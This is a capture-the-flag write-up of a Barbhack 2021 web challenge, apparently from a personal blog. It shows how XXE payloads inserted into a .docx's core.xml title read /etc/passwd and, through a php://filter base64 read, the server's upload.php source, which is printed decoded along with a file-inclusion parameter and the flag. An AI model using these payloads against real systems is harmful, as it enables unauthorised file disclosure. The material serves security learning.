## Barbhack is back!

In the most unbelievable turn of events, Barbhack 2021 happened for the second time, against all odds! 

### asdf! 
 
 One of the CTF easy-medium(easium?) Web challenges was a document upload website that accepts .docx files. The challenge caption says "Focus on the title".
 
 ![homepage](https://eqqn.github.io/images/brb21home.jpg)

A helpful sample file is provided, and when you submit it, the upload page returns the document title and a local path where it is stored.

The upload seems to work only for valid documents, so uploading a php file file didn't quite work.

### Docx? More like .zip

You can unpack a word document with zip :

```
sample
├── [Content_Types].xml
├── customXml
│   ├── item1.xml
│   ├── itemProps1.xml
│   └── _rels
│       └── item1.xml.rels
├── docProps
│   ├── app.xml
│   ├── core.xml
├── _rels
└── word
    ├── document.xml
    ├── endnotes.xml
    ├── fontTable.xml
    ├── footer1.xml
    ├── footer2.xml
    ├── footer3.xml
    ├── footnotes.xml
    ├── header1.xml
    ├── header2.xml
    ├── header3.xml
    ├── _rels
    │   └── document.xml.rels
    ├── settings.xml
    ├── styles.xml
    ├── theme
    │   └── theme1.xml
    └── webSettings.xml
```

We will be editing the files and zipping it back to evil.docx

```
unzip sample.docx
(modify stuff)
zip -r evil.docx *
```

The title of sample.docx is *"try asdf!"*, which can be found in **docProps/core.xml**.

Php code in title didnt display/work(?) so after some research I tried XXE.. [1]

### Getting the XXE

A quick search for "docx exploit php" will return some results, mostly relating to XXE. 

We modify the original **core.xml** to include the XXE string  `<!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]> ` AND to call the XXE we add `&test;` to the `<dc:title>` element.

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<dc:title>&test;</dc:title>
<dc:subject></dc:subject><dc:creator></dc:creator><cp:keywords></cp:keywords><dc:description></dc:description><cp:lastModifiedBy></cp:lastModifiedBy><cp:revision>1</cp:revision><dcterms:created xsi:type="dcterms:W3CDTF">2015-08-01T19:00:00Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2015-09-08T19:22:00Z</dcterms:modified></cp:coreProperties>
```

 ![passwd](https://eqqn.github.io/images/brb21passwd.jpg)
 
 
 We confirmed that it works, now which file to retrieve? Root-me always tells us to go after the source code first, so lets do that. 
 
 If you cause an error on the page, you will get the path of the php file. 

`<!DOCTYPE test [<!ENTITY test SYSTEM 'random'>]>` to force error

 ![passwd](https://eqqn.github.io/images/brb21error.jpg)
 

`<!DOCTYPE test [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=file:///var/www/html/upload.php'>|>`  to exfiltrate ( you need to encode the php code or else it will not display) 


### source code returned

```
Title 'PD9waHAKCnNlc3Npb25fc3RhcnQoKTsKaWYgKCFpc3NldCgkX1NFU1NJT05bJ3JlZmVycmVyJ10pKSB7CgkkX1NFU1NJT05bJ3JlZmVycmVyJ10gPSBpc3NldCgkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10pID8gJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddIDogJ24vYSc7CgkkX1NFU1NJT05bJ3VzZXItYWdlbnQnXSA9IGlzc2V0KCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkgPyAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10gOiAnbi9hJzt9CgppZihpc3NldCgkX1BPU1RbInN1Ym1pdCJdKSkgewogICAgJHRhcmdldF9maWxlID0gZ2V0Y3dkKCkuIi91cGxvYWQvIi5tZDUoJF9GSUxFU1siZmlsZSJdWyJ0bXBfbmFtZSJdKTsKICAgIGlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1siZmlsZSJdWyJ0bXBfbmFtZSJdLCAkdGFyZ2V0X2ZpbGUpKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJHJlc3VsdCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCJ6aXA6Ly8iLiR0YXJnZXRfZmlsZS4iI2RvY1Byb3BzL2NvcmUueG1sIik7CiAgICAgICAgICAgICR4bWwgPSBuZXcgU2ltcGxlWE1MRWxlbWVudCgkcmVzdWx0LCBMSUJYTUxfTk9FTlQpOwogICAgICAgICAgICAkeG1sLT5yZWdpc3RlclhQYXRoTmFtZXNwYWNlKCJkYyIsICJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIpOwogICAgICAgICAgICBmb3JlYWNoKCR4bWwtPnhwYXRoKCcvL2RjOnRpdGxlJykgYXMgJHRpdGxlKXsKICAgICAgICAgICAgICAgIGVjaG8gIlRpdGxlICciLiR0aXRsZSAuICInIGhhcyBiZWVuIGFkZGVkLjxici8+IjsKICAgICAgICAgICAgfQogICAgICAgICAgICBlY2hvKCR0YXJnZXRfZmlsZSk7CiAgICAgICAgICAgIGVjaG8oIlxuIik7CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRlKXsKICAgICAgICAgICAgcHJpbnRfcigkZSk7CiAgICAgICAgICAgIGVjaG8gIlRoZSBmaWxlIHlvdSB1cGxvYWRlZCBpcyBub3QgYSB2YWxpZCB4bWwgb3IgZG9jeCBmaWxlLiI7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICJTb3JyeSwgdGhlcmUgd2FzIGFuIGVycm9yIHVwbG9hZGluZyB5b3VyIGZpbGUuIjsKICAgIH0KfQoKIyBicmJ7MWEyMjBkOWYzNDY0MjI4OTA5NGI4YjZkMGQ0MzQzOWJ9CgppZiAoaXNzZXQoJF9HRVRbJzFjYTI1MWU2NjkzOGIxMTVlYmQ4OWM4ZjViYjNjN2Y5YjBmNmFiNDM5ODEwNGQ0YzI1NGNkYmM1ZTY1NTUxNzEnXSkgIT0gTlVMTCkgewogICAgZWNobyAiPHA+IjsKICAgIGluY2x1ZGUoIi92YXIvd3d3L2h0bWwvIiAuJF9HRVRbJzFjYTI1MWU2NjkzOGIxMTVlYmQ4OWM4ZjViYjNjN2Y5YjBmNmFiNDM5ODEwNGQ0YzI1NGNkYmM1ZTY1NTUxNzEnXSk7CiAgICBlY2hvICI8L3A+IjsKfQo=' has been added.
/var/www/html/upload/78b8b7de14e5571a0d03b972199e44cb 

```

decoded

```

<?php

session_start();
if (!isset($_SESSION['referrer'])) {
	$_SESSION['referrer'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'n/a';
	$_SESSION['user-agent'] = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'n/a';}

if(isset($_POST["submit"])) {
    $target_file = getcwd()."/upload/".md5($_FILES["file"]["tmp_name"]);
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
        try {
            $result = file_get_contents("zip://".$target_file."#docProps/core.xml");
            $xml = new SimpleXMLElement($result, LIBXML_NOENT);
            $xml->registerXPathNamespace("dc", "http://purl.org/dc/elements/1.1/");
            foreach($xml->xpath('//dc:title') as $title){
                echo "Title '".$title . "' has been added.<br/>";
            }
            echo($target_file);
            echo("\n");
        } catch (Exception $e){
            print_r($e);
            echo "The file you uploaded is not a valid xml or docx file.";
        }
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}

# brb{1a220d9f34642289094b8b6d0d43439b}

if (isset($_GET['1ca251e66938b115ebd89c8f5bb3c7f9b0f6ab4398104d4c254cdbc5e6555171']) != NULL) {
    echo "<p>";
    include("/var/www/html/" .$_GET['1ca251e66938b115ebd89c8f5bb3c7f9b0f6ab4398104d4c254cdbc5e6555171']);
    echo "</p>";
}
```

#### Flag
**brb{1a220d9f34642289094b8b6d0d43439b}**

### Credits

[1] https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/

[2] the neighbour I asked how far I am from solving at 5AM, because I was tired and my train coming in 50 minutes :D 

[3] Barbhack for organizing another amazing event
